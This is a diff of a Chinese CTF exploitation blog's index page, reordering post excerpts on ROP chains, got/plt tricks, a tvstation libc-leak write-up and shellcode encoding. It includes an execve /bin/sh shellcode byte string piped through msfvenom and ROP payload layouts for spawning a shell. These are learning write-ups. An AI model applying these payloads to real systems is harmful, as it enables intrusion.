@@ -149,51 +149,6 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <p>最开始我想为什么不直接运行调用，后面才知道是特权模式问题。如果直接调用，就会出现访问错误，因为我们构造的函数的函数地址是在内核空间中，而用户空间是无法运行内核空间的函数。所以需要调用write(fd, rop, 0x30 * 8);进入到内核空间，获得特权模式下ring0的权限，然后运行用户空间的get_root()函数，再进入到内核空间寻找对于的commit_creds函数和prepare_kernel_cred(0)结构体，从而提权。</p>
 <p>参考资料:</p>
 <p>ctfwiki</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/ROP%E6%B1%87%E6%80%BB/">ROP汇总</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、32位ROP：</p>
-<p>1.如果是直接跳转plt表中的地址，那么栈的布置顺序应该是：</p>
-<p>system函数-system函数的返回地址-sytem函数的参数。</p>
-<p>2.但如果是跳转call system，那么由于call指令会自动push进eip，则栈布置应该为：</p>
-<p>call system函数地址-system函数参数。</p>
-<p>(两者不太一样，需要加以区分。后面会有got表和plt的详细讲解)</p>
-<p>二、64位ROP：</p>
-<p>需要传参指令：pop rdi;ret。这里就不用管是plt还是call了，因为传参是rdi传参，返回地址是啥都没关系，多参数的需要万能gadget。</p>
-<p>▲64位程序中函数取参数是取rdi中内容指向的内存中的内容，相当于<em>rdi，同样的32位程序中取参是取栈上的内容指向的内存中的内容，相当于</em>[ebp+var_0xh]，所以直接输入binsh字符串来赋值给rdi或者赋值给函数参数肯定是不行的，因为这不是一个有效的地址，而是字符串的二进制形式。</p>
-<p>三、万能gadget</p>
-<p>1.传入got表和plt表的区别：</p>
-<p>万能gadget中调用我们想调用的函数为call qword ptr[r12+rbx*8]，硬编码为FF，是取r12中保存的内容当作一个地址a，这个地址a保存的内容应该是一个地址b，该地址b指向的地方才是可以被执行的实际代码位置。</p>
-<p>例如:</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">r12:    got_a</span><br><span class="line">got_a:  0x111</span><br><span class="line">0x111:  mov a b</span><br></pre></td></tr></table></div></figure>
-
-<p>所以call qword ptr[r12+rbx*8]实际执行跳转到的位置是0x111，而执行的代码是mov a b;只能传入got表，如果传入plt表，那么应该如下：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">r12:          plt_a</span><br><span class="line">plt_a:        jmp got_a</span><br><span class="line">jmp got_a:    无效编码地址</span><br><span class="line">#这个jmp got_a转换成硬编码就不是一个有效地址</span><br></pre></td></tr></table></div></figure>
-
-<p>2.不同的call区别：</p>
-<p>FF的call后面跟的是地址的地址。例如call [func], 跳转的地方就应该是func这个地址里保存的内容，也就是*func。</p>
-<p>E8的call后面跟的是地址。例如call func，跳转的地方就是func的开头。</p>
-<p>▲普通call，EB编码：call fun_c(最常用的)</p>
-<p>fun_c： mov a b</p>
-<p>相当于直接跳转到fun_c这个地址来执行代码</p>
-<p>四、main函数返回的ROP：</p>
-<p>1.最开始启动程序时，main函数栈不是汇编代码写的那么大，而应该再大两个0x04用来存放全局偏移，所以计算偏移时就需要再加上两个0x04</p>
-<p>2.通过再次进入main函数中之后，程序只会依照汇编代码来构造Mainh函数栈，所以这一次里的main函数栈中就没有全局偏移的东西了，正常计算偏移。</p>
-<p>五、技巧性：</p>
-<p>1.通过覆盖返回地址调用函数时，可以注意上一个函数栈中的esp的位置，然后直接通过Pop等操作继续往下retn到输入的payload中的函数地址。(RedHat 2017-pwn1)</p>
-<p>2.rop主要是找system函数和binsh字符串，没有的话其实用int80可以代替system，然后sh\bash什么的也可以代替binsh字符串。</p>
-<p>3.使用int80的话需要设置寄存器，同样如果有其它可以用到的系统调用，可以通过：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://syscalls.kernelgrok.com/" >http://syscalls.kernelgrok.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 这个来查找</p>
-<p>4.onegadget需要条件满足，可以直接查：one_gadget libc文件，然后通过调试或者IDA看汇编，观察到达调用onegadget的时候条件满不满足。</p>
-<p>5.查找：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">one_gadget libc_so.6</span><br><span class="line">ROPgadget --binary file | grep &quot;pop eax ; pop ebx ; pop esi ; pop edi ; ret&quot;</span><br></pre></td></tr></table></div></figure>
-
-<p>总结：</p>
-<p>所以万能gadget中通过r12，传入跳转函数的地址只能是发生延迟绑定之后的got表地址，而不能是plt表地址或者是没有发生延迟绑定的got表地址，(延迟绑定只能通过plt表来操作，没有发生延迟绑定之前，该got表中的内容是等同于无效的，只是一个extern段的偏移地址，除非该函数func是静态编译进程序里面的，那么got表中的内容就是该函数的真实有效地址，不会发生延迟绑定。)因为plt表中的内容转换成硬编码压根就不是一个有效地址，更别说跳转到该地址保存的内容的地方了。有人说跳转到plt表执行的就是跳转got表，那应该是一样的啊，但FF的call并不是跳转到plt来执行里面的代码，而是取plt表中内容当作一个地址再跳转到该地址来执行代码，所以有时候需要看汇编代码来决定究竟是传入got表还是传入plt表。同样也可以看到plt表中的硬编码是FF，也就是并不是跳转got表，而是取got表中保存的内容当作一个地址再来跳转。</p>
-<p>需要跳转函数时，有[]的-只能传got表，没[]的-传plt表(plt表更安全好使，但后面格式化字符串劫持got表又有点不太一样，情况比较复杂)。</p>
-<p>需要打印真实函数地址时，传的一定是got表，这样就一定没错。</p>
-<p>当有call eax;这类语句时，eax中保存的一定得是一个有效地址，因为这里的call硬编码也是0FF。</p>
-<p>1.往puts函数中传入函数在got表中的地址（elf.got）参数可以打印出被加载在Libc中的实际内存地址。</p>
-<p>2.用覆盖返回地址ret的形式调用函数需要用函数在plt表中的地址，（elf.plt）这是库函数地址，需要先到plt中，然后再到got表中，这是正常的函数调用。</p>
-<p>3.但如果在gadget中，则可以通过给r12赋值来调用elf.got表中的函数，因为这个是call qword ptr[r12+rbx*8]，指向的是函数在got表中真实地址，需要的是函数在got表中的地址。如果只是call addr，则应该是call函数在plt表中的地址。</p>
-<p>4.万能gadget一般在_libc_csu_init中，或者init或者直接ROPgadget查也可以</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/RedHat%202017-pwn1/">RedHat 2017-pwn1</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规 checksec查看一下，发现开启了NX，IDA打开程序找漏洞，变量V1的首地址为bp-28h，即变量在栈上。而之后还有__isoc99_scanf不限制长度的函数，所以输入会导致栈溢出。这样就可以寻找system和”bin/sh”来getshell了。</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int v1; // [esp+18h] [ebp-28h]</span><br><span class="line">----------------------------------------------------------</span><br><span class="line">__isoc99_scanf(&quot;%s&quot;, &amp;v1);</span><br></pre></td></tr></table></div></figure>
 
@@ -239,6 +194,87 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
 <p>参考资料：</p>
 <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/sweetbaby/p/14148625.html" >https://www.cnblogs.com/sweetbaby/p/14148625.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/ROP%E6%B1%87%E6%80%BB/">ROP汇总</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、32位ROP：</p>
+<p>1.如果是直接跳转plt表中的地址，那么栈的布置顺序应该是：</p>
+<p>system函数-system函数的返回地址-sytem函数的参数。</p>
+<p>2.但如果是跳转call system，那么由于call指令会自动push进eip，则栈布置应该为：</p>
+<p>call system函数地址-system函数参数。</p>
+<p>(两者不太一样，需要加以区分。后面会有got表和plt的详细讲解)</p>
+<p>二、64位ROP：</p>
+<p>需要传参指令：pop rdi;ret。这里就不用管是plt还是call了，因为传参是rdi传参，返回地址是啥都没关系，多参数的需要万能gadget。</p>
+<p>▲64位程序中函数取参数是取rdi中内容指向的内存中的内容，相当于<em>rdi，同样的32位程序中取参是取栈上的内容指向的内存中的内容，相当于</em>[ebp+var_0xh]，所以直接输入binsh字符串来赋值给rdi或者赋值给函数参数肯定是不行的，因为这不是一个有效的地址，而是字符串的二进制形式。</p>
+<p>三、万能gadget</p>
+<p>1.传入got表和plt表的区别：</p>
+<p>万能gadget中调用我们想调用的函数为call qword ptr[r12+rbx*8]，硬编码为FF，是取r12中保存的内容当作一个地址a，这个地址a保存的内容应该是一个地址b，该地址b指向的地方才是可以被执行的实际代码位置。</p>
+<p>例如:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">r12:    got_a</span><br><span class="line">got_a:  0x111</span><br><span class="line">0x111:  mov a b</span><br></pre></td></tr></table></div></figure>
+
+<p>所以call qword ptr[r12+rbx*8]实际执行跳转到的位置是0x111，而执行的代码是mov a b;只能传入got表，如果传入plt表，那么应该如下：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">r12:          plt_a</span><br><span class="line">plt_a:        jmp got_a</span><br><span class="line">jmp got_a:    无效编码地址</span><br><span class="line">#这个jmp got_a转换成硬编码就不是一个有效地址</span><br></pre></td></tr></table></div></figure>
+
+<p>2.不同的call区别：</p>
+<p>FF的call后面跟的是地址的地址。例如call [func], 跳转的地方就应该是func这个地址里保存的内容，也就是*func。</p>
+<p>E8的call后面跟的是地址。例如call func，跳转的地方就是func的开头。</p>
+<p>▲普通call，EB编码：call fun_c(最常用的)</p>
+<p>fun_c： mov a b</p>
+<p>相当于直接跳转到fun_c这个地址来执行代码</p>
+<p>四、main函数返回的ROP：</p>
+<p>1.最开始启动程序时，main函数栈不是汇编代码写的那么大，而应该再大两个0x04用来存放全局偏移，所以计算偏移时就需要再加上两个0x04</p>
+<p>2.通过再次进入main函数中之后，程序只会依照汇编代码来构造Mainh函数栈，所以这一次里的main函数栈中就没有全局偏移的东西了，正常计算偏移。</p>
+<p>五、技巧性：</p>
+<p>1.通过覆盖返回地址调用函数时，可以注意上一个函数栈中的esp的位置，然后直接通过Pop等操作继续往下retn到输入的payload中的函数地址。(RedHat 2017-pwn1)</p>
+<p>2.rop主要是找system函数和binsh字符串，没有的话其实用int80可以代替system，然后sh\bash什么的也可以代替binsh字符串。</p>
+<p>3.使用int80的话需要设置寄存器，同样如果有其它可以用到的系统调用，可以通过：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://syscalls.kernelgrok.com/" >http://syscalls.kernelgrok.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 这个来查找</p>
+<p>4.onegadget需要条件满足，可以直接查：one_gadget libc文件，然后通过调试或者IDA看汇编，观察到达调用onegadget的时候条件满不满足。</p>
+<p>5.查找：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">one_gadget libc_so.6</span><br><span class="line">ROPgadget --binary file | grep &quot;pop eax ; pop ebx ; pop esi ; pop edi ; ret&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>总结：</p>
+<p>所以万能gadget中通过r12，传入跳转函数的地址只能是发生延迟绑定之后的got表地址，而不能是plt表地址或者是没有发生延迟绑定的got表地址，(延迟绑定只能通过plt表来操作，没有发生延迟绑定之前，该got表中的内容是等同于无效的，只是一个extern段的偏移地址，除非该函数func是静态编译进程序里面的，那么got表中的内容就是该函数的真实有效地址，不会发生延迟绑定。)因为plt表中的内容转换成硬编码压根就不是一个有效地址，更别说跳转到该地址保存的内容的地方了。有人说跳转到plt表执行的就是跳转got表，那应该是一样的啊，但FF的call并不是跳转到plt来执行里面的代码，而是取plt表中内容当作一个地址再跳转到该地址来执行代码，所以有时候需要看汇编代码来决定究竟是传入got表还是传入plt表。同样也可以看到plt表中的硬编码是FF，也就是并不是跳转got表，而是取got表中保存的内容当作一个地址再来跳转。</p>
+<p>需要跳转函数时，有[]的-只能传got表，没[]的-传plt表(plt表更安全好使，但后面格式化字符串劫持got表又有点不太一样，情况比较复杂)。</p>
+<p>需要打印真实函数地址时，传的一定是got表，这样就一定没错。</p>
+<p>当有call eax;这类语句时，eax中保存的一定得是一个有效地址，因为这里的call硬编码也是0FF。</p>
+<p>1.往puts函数中传入函数在got表中的地址（elf.got）参数可以打印出被加载在Libc中的实际内存地址。</p>
+<p>2.用覆盖返回地址ret的形式调用函数需要用函数在plt表中的地址，（elf.plt）这是库函数地址，需要先到plt中，然后再到got表中，这是正常的函数调用。</p>
+<p>3.但如果在gadget中，则可以通过给r12赋值来调用elf.got表中的函数，因为这个是call qword ptr[r12+rbx*8]，指向的是函数在got表中真实地址，需要的是函数在got表中的地址。如果只是call addr，则应该是call函数在plt表中的地址。</p>
+<p>4.万能gadget一般在_libc_csu_init中，或者init或者直接ROPgadget查也可以</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/Security%20Fest%20CTF%202016-tvstation/">Security Fest CTF 2016-tvstation</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.题目给了libc库，需要查看一下版本，直接拖到Linux中运行一下./libc.so.6_x64，就可以知道是libc2.24的，但Linux中的libc没有该版本，所以用pwndocker来连接运行。具体怎么用看下方链接，同样docker也自行学习。</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/skysider/pwndocker" >https://github.com/skysider/pwndocker</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>如果需要使用到这个libc调试，则在python中设置下列代码：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">io = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./tvstation&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6_x64&quot;&#125;)</span><br></pre></td></tr></table></div></figure>
+
+<p>2.然后开始分析文件，常规checksec，开了NX，IDA打开文件找漏洞，发现输入4进入debug函数后可以泄露system的内存地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">v0 = dlsym((void *)0xFFFFFFFFFFFFFFFFLL, &quot;system&quot;);</span><br><span class="line">sprintf(fmsg, info, v0);</span><br><span class="line">v1 = strlen(fmsg);</span><br><span class="line">write(1, fmsg, v1);</span><br></pre></td></tr></table></div></figure>
+
+<p>dlsym()的函数原型是</p>
+<p>void* dlsym(void* handle,const char* symbol);</p>
+<p>该函数在&lt;dlfcn.h&gt;文件中,handle是由dlopen打开动态链接库后返回的指针，symbol就是要求获取的函数的名称，函数返回值是void*,指向函数的地址，供调用使用。write函数的fd是1，所以就相当于直接打印在屏幕上，这里涉及linux系统调用号内容，可以直接查linux下的目录/usr/include/asm/中的unistd_32.h和unistd_64.h。</p>
+<p>这段代码的意思就是把指向system函数的指针返回给v0,然后将v0格式化输出给fmsg，之后将fmsg原封不动打印在屏幕上，第一次看到猜不出来可以直接运行该文件试试呗。之后会进入一个debug_func()，这里存在栈溢出：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">__int64 buf; // [rsp+0h] [rbp-20h]</span><br><span class="line">return read(0, &amp;buf, 0xC8uLL);</span><br></pre></td></tr></table></div></figure>
+
+<p>3.现在有了system的内存地址和栈溢出，就差/bin/sh字符串了。这里用IDA打开题目给的libc文件，可以找到bin/sh字符串的地址binsh_libc_addr和system的地址system_libc_addr。所以这就相当于有system的被libc加载的真实地址，那么system的真实system_addr减去system_libc_addr就可以得到Libc被加载进来的首地址libc_start_addr。即现掌握地址：libc_start_addr，system_addr，system_libc_addr，binsh_libc_addr通过计算可得：binsh_addr = system_addr - system_libc_addr + binsh_libc_addr。这不是栈溢出有了，system函数和binsh字符串的真实地址有了，这不直接getshell就完事了吗，闹啥呢，这破题目，没点技术含量。</p>
+<p>4.但程序还是得走走，64位程序，所以需要使用ROPgadget表来查找pop rdi ; ret这个代码所在的地址，也是在Libc中查找到，然后加上libc_start_addr就可得到pop_rdi_addr。</p>
+<p>5.之后计算偏移量，远程调试下进行，payload依次为padding + pop_rdi_addr + binsh_addr + system_addr。</p>
+<p>6.再考虑输入情况：先在Linux下运行，所以能看到需要在接收到”: ”时可以输入4，然后进入到打印system_addr，打印完之后，需要从打印出来的system地址读取进我们设定的system_addr。</p>
+<p>7.由于打印格式是@x0x7ffffff，所以在recvuntil”@x”，之后开始获取打印的system_addr:system_addr = int(io.recv(12), 16)，以十六进制总共读取12位</p>
+<p>8.读取完成system_addr后就可以开始输入payload，之后就可以interactive()。</p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/ShellCode%E6%B1%87%E6%80%BB/">Shellcode汇总</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、shellcode的查找和获取：</p>
+<p>1.地址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/" >http://shell-storm.org/shellcode/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>2.获取方式：可以通过linux/x86/sh/bash/execve/shellcode等等关键词来查找</p>
+<p>二、shellcode的编码：</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">python -c &#x27;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;)&#x27; | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload</span><br></pre></td></tr></table></div></figure>
+
+<p>1.’import sys; sys.stdout.write(“shellcode”)’：这是导入包之后写入编码的shellcode。</p>
+<p>2.由于msfvenom只能从stdin中读取，所以使用Linux管道符”|”来使得shellcode作为python程序的输出。</p>
+<p>3.此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中。</p>
+<p>4.Shellcode的执行条件一般都是call Register，这里的BufferRegister设置是因为通过指令call eax调用shellcode,所以配置BufferRegister=EAX。最后即可在payload中看到对应的被编码后的代码。</p>
+<p>三、shellcode的两段执行：</p>
+<p>1.需要泄露RWX段的地址，读取泄露地址：</p>
+<p>2.需要跳转jmp命令或者是return/call，但是return会pop eip，call会push eip，都会修改掉栈中的内容。如果shellcode的两段执行计算偏移地址的话，可能需要将这两个内容也计算进入。但是jmp就不会需要，是直接无条件跳转，所以大多时候选择jmp比较好。</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/StarCTF2019_heap_master/">StarCTF2019_heap_master</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>这道题学到了很多，特此记录一下。</p>
 
         <h1 id="1-常规checksec一下，保护全开。"   >
@@ -298,40 +334,29 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></he
       <p>(1)unsortedbin attack：修改bk任意写main_arena，这里bk通常可以进行部分写来爆破，也常常用来修改global_max_fast，使得fastbinY越界写。</p>
 <p>(2)FSOP的利用中，不一定非得修改flag，修改_IO_write_base、_IO_write_ptr、_IO_read_end、_IO_write_end也可以，其中需要满足_IO_read_end等于_IO_write_base来起到flag的作用绕过检查。</p>
 <p>(3)fastbinY数组的越界申请，修改其fd可实现任意写，这点和利用fastbinY数组中chunk大小在main_arena中留下0x20~0x80的数据异曲同工。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/ShellCode%E6%B1%87%E6%80%BB/">Shellcode汇总</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、shellcode的查找和获取：</p>
-<p>1.地址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/" >http://shell-storm.org/shellcode/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>2.获取方式：可以通过linux/x86/sh/bash/execve/shellcode等等关键词来查找</p>
-<p>二、shellcode的编码：</p>
-<p>示例：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">python -c &#x27;import sys; sys.stdout.write(&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;)&#x27; | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload</span><br></pre></td></tr></table></div></figure>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/TJCTF%202016-oneshot/">TJCTF 2016-oneshot</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，只开了NX，然后IDA打开找漏洞。发现找不到什么漏洞，但是有个很奇怪的地方</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">__int64 (__fastcall *v4)(const char *); // [rsp+8h] [rbp-8h]</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">__isoc99_scanf(&quot;%ld&quot;, &amp;v4);</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">return v4(&quot;Good luck!&quot;);</span><br></pre></td></tr></table></div></figure>
 
-<p>1.’import sys; sys.stdout.write(“shellcode”)’：这是导入包之后写入编码的shellcode。</p>
-<p>2.由于msfvenom只能从stdin中读取，所以使用Linux管道符”|”来使得shellcode作为python程序的输出。</p>
-<p>3.此外配置编码器为x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为payload的文件中。</p>
-<p>4.Shellcode的执行条件一般都是call Register，这里的BufferRegister设置是因为通过指令call eax调用shellcode,所以配置BufferRegister=EAX。最后即可在payload中看到对应的被编码后的代码。</p>
-<p>三、shellcode的两段执行：</p>
-<p>1.需要泄露RWX段的地址，读取泄露地址：</p>
-<p>2.需要跳转jmp命令或者是return/call，但是return会pop eip，call会push eip，都会修改掉栈中的内容。如果shellcode的两段执行计算偏移地址的话，可能需要将这两个内容也计算进入。但是jmp就不会需要，是直接无条件跳转，所以大多时候选择jmp比较好。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/Security%20Fest%20CTF%202016-tvstation/">Security Fest CTF 2016-tvstation</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.题目给了libc库，需要查看一下版本，直接拖到Linux中运行一下./libc.so.6_x64，就可以知道是libc2.24的，但Linux中的libc没有该版本，所以用pwndocker来连接运行。具体怎么用看下方链接，同样docker也自行学习。</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/skysider/pwndocker" >https://github.com/skysider/pwndocker</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>如果需要使用到这个libc调试，则在python中设置下列代码：</p>
